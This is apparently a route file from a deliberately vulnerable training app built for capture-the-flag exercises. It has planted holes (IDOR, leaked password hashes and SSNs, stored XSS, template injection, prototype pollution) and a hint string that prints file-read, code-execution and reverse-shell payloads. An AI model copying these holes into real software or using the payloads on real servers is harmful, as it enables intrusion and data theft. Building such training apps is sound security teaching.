'use strict';

const express = require('express');
const ejs = require('ejs');
const { getDb } = require('../db/connection');
const { requireAuth, optionalAuth } = require('../middleware/auth');
const { deepMerge } = require('../utils/merge');

const router = express.Router();

// ---- GET /api/users/me ----
router.get('/me', requireAuth, (req, res) => {
  const out = withProtoFlag(serializeUserFull(req.user));
  // CH-M05: flag when caller used alg:none AND token claimed admin role.
  if (req.tokenAlg === 'none' && req.tokenPayload && req.tokenPayload.role === 'admin') {
    out.flag_m05 = 'FLAG{none-algorithm-still-a-thing}';
  }
  res.json(out);
});

// ---- GET /api/users/:id ----
// CH-E03: IDOR / BOLA — no ownership check.
// CH-M04: returns the entire row including password_hash, mfa_secret, internal_notes, ssn.
//
// Authorization model used to credit CH-E03:
//   - owner viewing own profile          → not IDOR (legitimate)
//   - admin (role/is_admin) viewing any  → not IDOR (legitimate cross-user)
//   - everyone else viewing a non-self   → IDOR / BOLA (the vuln)
router.get('/:id', requireAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (Number.isNaN(id)) return res.status(400).json({ error: 'bad_id' });
  const user = getDb().prepare('SELECT * FROM users WHERE id = ?').get(id);
  if (!user) return res.status(404).json({ error: 'not_found' });

  const out = serializeUserFull(user);
  if (isIdorViolation(req.user, user)) {
    out.flag_e03 = 'FLAG{idor-classic-find-the-other-user}';
  }
  res.json(out);
});

function isIdorViolation(viewer, target) {
  if (!viewer || !target) return false;
  if (viewer.id === target.id) return false;             // own resource
  if (viewer.is_admin || viewer.role === 'admin') return false; // admin has legit access
  return true;
}
module.exports.isIdorViolation = isIdorViolation;

// ---- PATCH /api/users/:id/bio ----
// CH-M01: bio is stored raw and rendered unescaped on the profile page.
// Detection: if the saved bio contains script-shaped content, emit the flag
// directly in the response. This makes the vuln capture immediate. The
// /api/_canary/stored-xss endpoint remains as a secondary path for students
// who chain the full attack against another logged-in user.
const XSS_PATTERN = /(<script\b|on(?:error|load|click|focus|mouseover)\s*=|javascript:|<svg[^>]*on\w+\s*=|<iframe\b|<img[^>]+onerror)/i;

router.patch('/:id/bio', requireAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (req.user.id !== id) return res.status(403).json({ error: 'forbidden' });
  const { bio } = req.body || {};
  if (typeof bio !== 'string') return res.status(400).json({ error: 'bio required' });
  getDb().prepare('UPDATE users SET bio = ? WHERE id = ?').run(bio, id);
  const out = { ok: true };
  if (XSS_PATTERN.test(bio)) {
    out.flag_m01 = 'FLAG{stored-xss-in-the-bio}';
    out.note = 'Bio is stored raw and rendered unescaped on your profile page; this content will execute when others view it.';
  }
  res.json(out);
});

// ---- POST /api/users/:id/email-template ----
// CH-H01: SSTI. The user-supplied template is concatenated into the EJS source
// and rendered server-side, giving access to process.env (and beyond) on RCE.
//
// Detection rules (any one suffices):
//   1. Render succeeded AND rendered output differs from the literal source
//      (EJS evaluated something inside the user template — `<%= 7*7 %>` → 49,
//      `<%= execSync('id') %>` → uid output, `<% for(...) %>` → loop body, etc.)
//   2. Render threw AND the template contains EJS delimiters (the student
//      reached the engine but their payload had a syntax error)
//   3. Template contains EJS delimiters in any form (last-resort fallback for
//      payloads that happen to round-trip identically)
//
// Why no "wasChanged" guard: the scoreboard dedupes captures by vuln_id, so
// re-firing on resave is harmless, and gating on novelty hid clear SSTI proofs
// from students who saved the same payload twice while iterating.
router.post('/:id/email-template', requireAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (req.user.id !== id) return res.status(403).json({ error: 'forbidden' });
  const { template, name } = req.body || {};
  if (typeof template !== 'string') return res.status(400).json({ error: 'template required' });

  // Persist the raw template
  getDb().prepare('UPDATE users SET email_template = ? WHERE id = ?').run(template, id);

  // VULNERABLE: user-controlled template source is concatenated with a fixed prefix
  // and rendered. EJS supports <%= ... %> and <% ... %>.
  const source = 'Hello, ' + template;
  const containsEjsSyntax = /<%[-=]?\s/.test(template) || /<%/.test(template);

  let rendered = null;
  let renderError = null;
  try {
    rendered = ejs.render(source, { name: name || req.user.name || 'friend' });
  } catch (e) {
    renderError = e.message;
  }

  const sstiDetected =
    (rendered !== null && rendered !== source) ||
    (renderError !== null && containsEjsSyntax) ||
    containsEjsSyntax;

  const out = renderError
    ? { ok: false, error: 'render_failed', detail: renderError }
    : { ok: true, rendered };

  if (sstiDetected) {
    out.flag_h01 = 'FLAG{template-engine-pwned}';
    // Pedagogically honest hint: EJS scope does NOT have `require`, so the
    // textbook `require('child_process')...` payloads fail with
    // "require is not defined". The reliable bypass is the constructor
    // gadget on `process.mainModule`. The hint below shows the chain that
    // actually executes inside this app's render scope.
    out.note =
      'Server-side template injection detected — your input was evaluated as code, not inserted as text. ' +
      "Note: `require` is NOT in EJS scope here, so `require('fs')…` style payloads throw. " +
      'The reliable bypass for this engine is the `process.mainModule.constructor._load(…)` gadget. ' +
      'Useful payloads: ' +
      "(env dump) `<%- JSON.stringify(process.env) %>`  ·  " +
      "(file read) `<%- global.process.mainModule.constructor._load('fs').readFileSync('/etc/passwd','utf8') %>`  ·  " +
      "(RCE)       `<%- global.process.mainModule.constructor._load('child_process').execSync('id').toString() %>`  ·  " +
      "(reverse shell) `<% global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/HOST/4444 0>&1\"') %>`. " +
      'Use `<%- … %>` for unescaped output, `<%= … %>` if you want HTML-escaped, `<% … %>` for fire-and-forget statements.';
  }

  res.status(renderError ? 500 : 200).json(out);
});

// ---- PATCH /api/users/:id/preferences ----
// CH-H02: prototype pollution via deepMerge.
//
// Honesty about what does and doesn't escalate privilege here:
//   - Setting `{"role":"admin"}` in preferences only adds a JSON field; the
//     real role lives on the users table column and isn't touched.
//   - Sending `{"__proto__":{"isAdmin":true}}` walks through deepMerge and
//     pollutes Object.prototype globally — `({}).isAdmin === true` afterwards,
//     and any code that does an `obj.isAdmin`-style check now misclassifies
//     non-admin users as admin.
//
// The response always reports the *effective* privilege so a student can see
// whether their attempt actually moved the needle, plus a targeted note when
// the body is mass-assignment-shaped (no-op) vs pollution-shaped (real).
const POLLUTION_KEYS = ['__proto__', 'constructor', 'prototype'];
function bodyContainsPollutionKey(raw) {
  // Match against the wire JSON, since Node's JSON parser turns `__proto__`
  // into an own enumerable key (ES2018+) and the regex catches it cleanly.
  return new RegExp(
    '(?:^|[",{])\\s*"(' + POLLUTION_KEYS.join('|') + ')"\\s*:'
  ).test(raw);
}

router.patch('/:id/preferences', requireAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (req.user.id !== id) return res.status(403).json({ error: 'forbidden' });
  if (!req.body || typeof req.body !== 'object') return res.status(400).json({ error: 'body required' });

  let prefs = {};
  try { prefs = JSON.parse(req.user.preferences || '{}'); } catch (_) {}

  const rawBody = JSON.stringify(req.body);
  const pollutionShaped = bodyContainsPollutionKey(rawBody);
  const escalationShaped = ['role', 'is_admin', 'isAdmin']
    .filter(k => Object.prototype.hasOwnProperty.call(req.body, k));

  const wasAdminBefore = ({}).isAdmin === true;

  // VULNERABLE: deepMerge does not guard __proto__/constructor/prototype.
  deepMerge(prefs, req.body);

  getDb().prepare('UPDATE users SET preferences = ? WHERE id = ?')
    .run(JSON.stringify(prefs), id);

  // Re-read the user from the DB so we report the *current* row (the role
  // column on `users` is the source of truth for stored privilege).
  const fresh = getDb().prepare('SELECT id, role, is_admin FROM users WHERE id = ?').get(id);

  const isAdminViaDb = !!fresh.is_admin || fresh.role === 'admin';
  const isAdminViaPollution = ({}).isAdmin === true;

  const out = {
    ok: true,
    preferences: prefs,
    effective_role: isAdminViaDb || isAdminViaPollution ? 'admin' : (fresh.role || 'user'),
    privilege_check: {
      role_in_db: fresh.role,
      is_admin_in_db: isAdminViaDb,
      object_prototype_isAdmin: isAdminViaPollution,
    },
  };

  if (escalationShaped.length > 0 && !pollutionShaped) {
    out.note =
      'Mass-assignment in preferences is a no-op here. Setting ' +
      escalationShaped.map(k => '`' + k + '`').join(', ') +
      " inside preferences only updates the JSON blob — the users.role column is the source of truth, and it still says `" +
      fresh.role + "`. " +
      'To actually escalate via this endpoint, target the merge function itself: ' +
      '`{"__proto__":{"isAdmin":true}}` pollutes Object.prototype, after which any ' +
      '`obj.isAdmin`-style admin check returns true for every object in the process.';
  }

  if (pollutionShaped && isAdminViaPollution && !wasAdminBefore) {
    out.flag_h02 = 'FLAG{proto-polluted-and-promoted}';
    out.note =
      'Prototype pollution successful. Object.prototype.isAdmin is now `true` globally — any code that ' +
      "checks `obj.isAdmin` on a plain object will misclassify the caller as an admin. The effect persists " +
      'until the container is restarted (or the offending key is deleted from `Object.prototype`).';
  } else if (pollutionShaped && isAdminViaPollution && wasAdminBefore) {
    // Re-running the same payload — pollution was already in place.
    out.flag_h02 = 'FLAG{proto-polluted-and-promoted}';
    out.note = 'Object.prototype was already polluted from a prior request; the side effect is global and persistent.';
  }

  res.json(out);
});

// ---- helpers ----
function serializeUserFull(u) {
  // CH-M04: returns ALL fields including password_hash / mfa_secret / ssn / internal_notes.
  return {
    id: u.id,
    email: u.email,
    password_hash: u.password_hash,
    name: u.name,
    bio: u.bio,
    avatar_path: u.avatar_path,
    role: u.role,
    is_admin: !!u.is_admin,
    mfa_secret: u.mfa_secret,
    internal_notes: u.internal_notes,
    ssn: u.ssn,
    preferences: safeParse(u.preferences),
    email_template: u.email_template,
    created_via: u.created_via,
    created_at: u.created_at,
  };
}

function safeParse(s) {
  try { return JSON.parse(s); } catch (_) { return {}; }
}

function withProtoFlag(out) {
  // CH-H02 detection: if Object.prototype was polluted with isAdmin=true,
  // ({}).isAdmin === true at request time (a global side-effect).
  if (({}).isAdmin === true && out.role !== 'admin') {
    out.flag_h02 = 'FLAG{proto-polluted-and-promoted}';
  }
  return out;
}

module.exports = router;
